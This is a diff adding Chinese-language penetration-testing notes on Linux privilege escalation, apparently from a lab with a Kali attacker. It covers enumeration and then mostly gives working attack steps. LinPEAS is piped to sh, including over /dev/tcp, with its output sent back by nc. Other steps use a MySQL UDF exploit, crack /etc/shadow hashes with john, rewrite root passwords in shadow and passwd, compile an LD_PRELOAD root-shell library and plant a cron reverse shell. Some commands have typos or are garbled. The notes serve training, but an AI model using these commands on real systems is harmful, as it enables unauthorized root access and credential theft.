@@ -404,4 +404,538 @@ MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.  28767.5 avail Mem
 在对现有的接口和网络路由进行初始检查后，值得查看现有通信。`netstat` 命令可以与几个不同选项一起使用，以收集有关现有连接信息。
 
 - netstat -a：显示所有在监听的端口和已建立的连接。
-- 
+- `netstat -at` / `netstat -ay`：列出 TCP 或 UDP 协议
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ netstat -at
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
+                                                                                                       
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ netstat -au
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+udp        0      0 10.10.10.5:bootpc       10.10.10.254:bootps     ESTABLISHED
+```
+
+- `netstat -l`：列出处于 “监听” 模式的端口
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ netstat -lt
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN 
+```
+
+- `netstat -s`：按协议列出网络使用统计数据
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ netstat -s 
+Ip:
+    Forwarding: 2
+    29 total packets received
+    1 with invalid addresses
+    0 forwarded
+    0 incoming packets discarded
+    28 incoming packets delivered
+    34 requests sent out
+    40 dropped because of missing route
+    OutTransmits: 34
+Icmp:
+    0 ICMP messages received
+    0 input ICMP message failed
+    ICMP input histogram:
+    4 ICMP messages sent
+    0 ICMP messages failed
+    ICMP output histogram:
+        destination unreachable: 4
+IcmpMsg:
+        OutType3: 4
+Tcp:
+    4 active connection openings
+    0 passive connection openings
+    4 failed connection attempts
+    0 connection resets received
+    0 connections established
+    8 segments received
+    8 segments sent out
+    0 segments retransmitted
+    0 bad segments received
+    4 resets sent
+Udp:
+    17 packets received
+    4 packets to unknown port received
+    0 packet receive errors
+    23 packets sent
+    0 receive buffer errors
+    0 send buffer errors
+    IgnoredMulti: 3
+UdpLite:
+TcpExt:
+    0 packet headers predicted
+IpExt:
+    InMcastPkts: 1
+    OutMcastPkts: 4
+    InBcastPkts: 3
+    InOctets: 7893
+    OutOctets: 4871
+    InMcastOctets: 635
+    OutMcastOctets: 755
+    InBcastOctets: 234
+    InNoECTPkts: 29
+MPTcpExt:
+```
+
+- `netstat -tp`：列出服务名称和 PID 信息的连接
+- `netstat -i`：显示接口统计信息
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ netstat -i 
+Kernel Interface table
+Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
+eth0             1500        0      0      0 0             0      0      0      0 BMRU
+lo              65536        0      0      0 0             0      0      0      0 LRU
+```
+
+- `netstat -ano`：显示所有套接字（a）、不解析名称（n）、显示计时器（o）
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ netstat -ano
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
+udp        0      0 10.10.10.5:68           10.10.10.254:67         ESTABLISHED off (0.00/0/0)
+raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node   Path
+unix  3      [ ]         STREAM     CONNECTED     16604    
+unix  3      [ ]         STREAM     CONNECTED     13991    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     13920    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     15235    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM      CONNECTED     6736     
+unix  3      [ ]         STREAM     CONNECTED     11367    /run/systemd/journal/stdout
+unix  2      [ ACC ]     STREAM     LISTENING     8700     /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     6085     
+unix  2      [ ACC ]     STREAM     LISTENING     8701     /run/systemd/io.systemd.MuteConsole
+......
+```
+
+#### find
+
+下面是查找设置 SUID 位文件的命令。
+
+```shell
+find / -perm -u=s type f 2>/dev/null
+```
+
+#### which
+
+- whereis：用于查找二进制文件、源文件和 man 手册的位置。它只能查找系统默认路径中的文件，不会搜索其他目录或挂载的磁盘。
+- which：查找命令所在的位置，并返回找到的第一个命令的完整路径，并返回找到的第一个命令的完整路径。他会在系统 PATH 环境变量中指定的目录中寻找，并返回找到的第一个可执行文件的路径。如果该命令在多个目录中都存在，则只返回最先找到的那个命令的位置。因此，which 命令通常用于查找可执行文件的位置。
+- locate：使用本地数据库来快速查找指定位置，不会实时更新文件系统，使用可能会出现找不到文件的情况，为了保证正确的，可以使用 `updatedb` 命令更新数据库。
+- type：用于查找命令是否内置命令、外部命令还是别名。如果是内置命令则返回 ”builtin“，如果是外部命令则返回可执行文件的位置，如果是别名则返回别名定义的命令。
+- apropos：用于在系统的 man 手册中搜索与指定关键词相关的条目。它可以帮助用户快速找到特定主题或命令相关手册页。
+- find：用于在指定路径下递归搜索符合条件的文件。它可以根据文件名、文件类型、文件大小、文件权限等条件来搜索文件。
+- grep：用于在指定文件中查找符合条件的字符串。支持正则表达式，可快速查找文本文件中的关键词。
+- where：与 which 类似，但他可以同时查找多个命令，而 which 只能查找单个命令。where 命令会在系统 PATH 环境变量中指定的所有目录中寻找，并放回找到的所有命令的位置。如果该命令在多个目录中都存在则会返回所有找到命令的位置。
+
+#### /etc/fstab
+
+检测未挂载的文件系统。
+
+```shell
+cat etc/fstab
+```
+
+### 自动化枚举
+
+#### 常用工具
+
+- LinPEAS：全称为 Linux Privilege Awesome Script，是一个用来搜索类 unix 主机上可能的提权路径的自动化脚本。
+- LinEnum：一个流行的 Linux 本地枚举脚本，用于收集有关系统的各种信息，识别不安全配置，提取可用于提升权限的漏洞信息。
+- linux-smart-enumeration（lse）：一个具有模块化功能的 Linux 本地枚举脚本。
+- linux-exploit-suggester：用于识别 Linux 系统中可能存在的可利用漏洞。
+- Linuxprivchecker：检查 Linux 系统潜在安全问题的 python 脚本。
+- unix-privese-check：识别类 UNIX 系统中可能的权限提升路径。
+
+### LinPEAS 最佳实践
+
+使用 `curl` 直接从 Github 中执行。
+
+```shell
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+使用 wget 下载后给权限单独执行。
+
+```shell
+# 本地网络下载 
+sudo python3 -m http.server 80 #kali 
+curl 10.10.10.5/linpeas.sh | sh #靶机 
+# 从内存中执行，结果发回kali 
+nc -lvnp 81 | tee linpeas.out #kali 
+curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 81 #靶机 
+# 没有curl的情况 
+sudo nc -q 5 -lvnp 80 < linpeas.sh #kali 
+cat < /dev/tcp/10.10.10.10/80 | sh #靶机
+
+# 输出到文件 
+./linpeas.sh -a > /dev/shm/linpeas.txt #主机 
+less -r /dev/shm/linpeas.txt #读取分色文件
+```
+
+使用 LinePEAS 二进制文件。
+
+```shell
+wget https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas_linux_amd64 chmod +x linpeas_linux_amd64 ./linpeas_linux_amd64
+```
+
+## 提权实战演示
+
+### mysql-udf
+
+使用 mysql 用户自定义函数提权，udf 是 User-Defined Function（用户自定义函数），可以在 SQL 查询中使用，类似于内置函数。通过使用 UDF 用户可以对数据库执行自定义操作，从而满足特定业务需求。用户自定义函数通常用于处理复杂的数据操作，简化查询，或者实现数据库本身不支持的特定功能。这是 mysql 数据库自带的功能，无需特定设置。
+
+#### 提权条件
+
+1. 掌握 mysql 数据库的账户：该账户对 mysql 用于 `create`、`insert`、`delete` 等权限，以创建和使用函数（最好是 root 账户）。
+2. secure_filr_priv 为空：使用命令 `show variables like '%secure_file_priv%'` 查看，`secure_file_priv` 是 mysql 系统变量，用于限制 `LOAD DATA`、`SELECT ... INTO OUTFILE`、`LOAD_FILE()` 等文件操作范围，它可以限制这些操作仅在特定目录下进行以增强系统的安全性。当 `secure_file_priv` 设置为一个非空目录路径时，这些操作仅允许在指定目录下进行。
+
+#### 准备利用条件
+
+```shell
+gcc -g -c raptor_udf2.c -fPIC
+```
+
+- -g：生成调试信息
+- -c：指示编译器仅编译源码，但不进行链接
+- -fPIC：告诉编译器生成位置无关代码（Position-Independent Code，PIC），这种代码可以在内存中的任意位置执行
+
+```shell
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+- -shared：生成一个共享库文件而非可执行文件
+- -Wl：将后面的选项传递给链接器
+- -soname,raptor_udf2.so：设置生成的共享库的 "soname"
+- -lc：链接器链接标准 C 库
+
+#### 利用过程
+
+```mysql
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+```
+
+- create table foo(line blob)：创建一个名为 "foo" 的表（table），包含名为 "line" 的列（column），数据类型为 BLOB。BLOB 表示 "Binary Large Object"，可以储存大量二进制数据。
+- foo 在计算机编程和网络中是一个常用占位符的名称。
+- create function do_system returns integer soname 'raptor_udf2.so'：寻找 plugin 目录中的 .so 文件。
+- 如果 dumpfile 失败，对于 AppArmor 编辑 `/etc/apparmor.d/usr.sbin.mysqld `文件，找到以下行：` /usr/sbin/mysqld { `，在此行下方添 加以下内容： `/usr/lib/mysql/plugin/** rw`。
+- 删除 mysql 函数命令：`DROP FUNCTION IF EXISTS dosystem;`。
+- 查询已有 udf：`SELECT * FROM mysql.func;`。
+
+执行：
+
+```mysql
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
+
+```bash
+/tmp/rootbash -p
+```
+
+### 可读 shadow 文件提权
+
+#### 利用过程
+
+查看 `/etc/shadow` 文件发现可读。
+
+```bash
+user@RedteamNotes:~$ ls -liah /etc/shadow
+1241132 -rw-r--rw- 1 root shadow 842 Apr 25  2023 /etc/shadow
+```
+
+读取 `/etc/shadow` 文件。
+
+```bash
+user@RedteamNotes:~$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+messagebus:*:19472:0:99999:7:::
+```
+
+将加密的密码复制到 kali，使用 john 破解密码。
+
+```bash
+# 靶机
+user@RedteamNotes:~$ cat /etc/shadow | grep ':\$'
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+```
+
+```bash
+#kali
+──(kali㉿kali)-[~/Work/Kali]
+└─$ cat >> passwd.txt << EOF
+heredoc> root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+heredoc> EOF
+                                                                                                       
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ cat passwd.txt          
+root:/euwmK.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+user:/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+```
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ vim hash
+                                                                                                       
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ cat hash 
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+                                                                                                       
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (root)     
+password321      (user)     
+2g 0:00:00:07 DONE (2026-01-14 05:55) 0.2735g/s 8474p/s 8685c/s 8685C/s simone13..kelly17
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+尝试登入。
+
+![](Pasted%20image%2020260114185635.png)
+
+### 可写 shadow 文件利用
+
+查看 `/etc/shadow` 文件发现可写。
+
+```bash
+user@RedteamNotes:~$ ls -liah /etc/shadow
+1241132 -rw-r--rw- 1 root shadow 842 Apr 25  2023 /etc/shadow
+```
+
+备份 shadow 文件。
+
+```bash
+user@RedteamNotes:~$ cp /etc/shadow /tmp/shadow.bak
+user@RedteamNotes:~$ ls /tmp
+backup.tar.gz  shadow.bak  useless
+```
+
+制作要替换的 sha-512 密码。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ mkpasswd -m sha-512 enilmalus
+$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0
+```
+
+修改 `/etc/shadow` 的 `root` 密码凭据。
+
+```bash
+user@RedteamNotes:~$ vim /etc/shadow
+user@RedteamNotes:~$ cat /etc/shadow | grep 'root'
+root:$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0:17298:0:99999:7:::
+```
+
+尝试登入。
+
+![](Pasted%20image%2020260114190632.png)
+
+### 可写 passwd 文件利用
+
+查看 `/etc/passwd` 文件发现可写。
+
+```bash
+1241288 -rw-r--rw- 1 root root 998 Apr 25  2023 /etc/passwd
+```
+
+备份 `/etc/passwd` 文件。
+
+```bash
+user@RedteamNotes:~$ cp /etc/passwd /tmp/passwd.bak
+user@RedteamNotes:~$ ls -liah /tmp/passwd.bak
+1158728 -rw-r--r-- 1 user user 998 Jan 14 06:10 /tmp/passwd.bak
+```
+
+制作并替换 root 密码。
+
+```bash
+user@RedteamNotes:~$ openssl passwd enilmalus
+Warning: truncating password to 8 characters
+8KZAn18Dg1XO6
+user@RedteamNotes:~$ vim /etc/passwd
+user@RedteamNotes:~$ cat /etc/passwd | grep 'root'
+root:8KZAn18Dg1XO6:0:0:root:/root:/bin/bash
+```
+
+尝试登入。
+
+![](Pasted%20image%2020260114191253.png)
+
+### sudo 环境变量提权
+
+枚举 sudo 权限，发现有 `LD_PRELOAD` 选项。
+
+```bash
+user@RedteamNotes:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+```
+
+`LD_PRELOAD` 允许任何程序使用共享库的功能。如果启用了 `env_keep` 选项，我们可以生成一个共享库，该共享库在允许程序之前加载和执行。
+
+1. 检查 `LD_PRELOAD` （带有 env_keep 选项）
+2. 编写一个简单的 C 代码作为共享对象（.so 扩展名）文件编译
+3. 使用 sudo 权限指向我们的 .so 文件的 `LD_PRELOAD` 选项运行程序
+
+制作 root shell。
+
+```bash
+user@RedteamNotes:/tmp/env_privTEST$ vim shell.c
+user@RedteamNotes:/tmp/env_privTEST$ cat shell.c 
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+}
+```
+
+编译文件。
+
+```bash
+user@RedteamNotes:/tmp/env_privTEST$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+user@RedteamNotes:/tmp/env_privTEST$ ls
+shell.c  shell.so
+```
+
+现在我们使用 sudo 运行任何程序时都可以使用此共享文件，通过指定 `LD_PRELOAD` 运行程序。
+
+```bash
+user@RedteamNotes:/tmp/env_privTEST$ pwd
+/tmp/env_privTEST
+user@RedteamNotes:/tmp/env_privTEST$ ls
+shell.c  shell.so
+user@RedteamNotes:/tmp/env_privTEST$ sudo LD_PRELOAD=/tmp/env_privTEST/shell.so find
+root@RedteamNotes:/tmp/env_privTEST# whoami
+root
+```
+
+解释一下：
+
+- LD：Linker Dynamic，即动态链接器，是操作系统中的一个组件，负责在程序运行时链接共享库到程序中。
+- PRELOAD：预加载，意味着在程序运行前动态链接库先加载有 LD_PRELOAD 环境变量指定的共享库。
+
+### 自动任务文件提权
+
+枚举自动任务。
+
+```bash
+user@RedteamNotes:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+
+可以发现每分钟以 root 权限运行 overwrite.sh 与 /usr/local/bin/compress.sh，查找阅读一下 overwrite.sh 的内容。
+
+```bash
+user@RedteamNotes:~$ locate overwrite.sh
+/usr/local/bin/overwrite.sh
+user@RedteamNotes:~$ ls -liah /usr/local/bin/overwrite.sh
+816761 -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+user@RedteamNotes:~$ cat /usr/local/bin/overwrite.sh
+#!/bin/bash
+
+echo `date` > /tmp/useless
+```
+
+发现可以修改 overwrite.sh 的内容，进行修改。
+
+```bash
+user@RedteamNotes:~$ vim /usr/local/bin/overwrite.sh
+user@RedteamNotes:~$ cat /usr/local/bin/overwrite.sh
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
+```
+
+在 kali 上监听 4444 端口，等待自动任务运行得到回显。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo rlwrap -cAr nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.10.5] from (UNKNOWN) [10.10.10.12] 34407
+bash: no job control in this shell
+root@RedteamNotes:~# whoami
+whoami
+root
+```
+
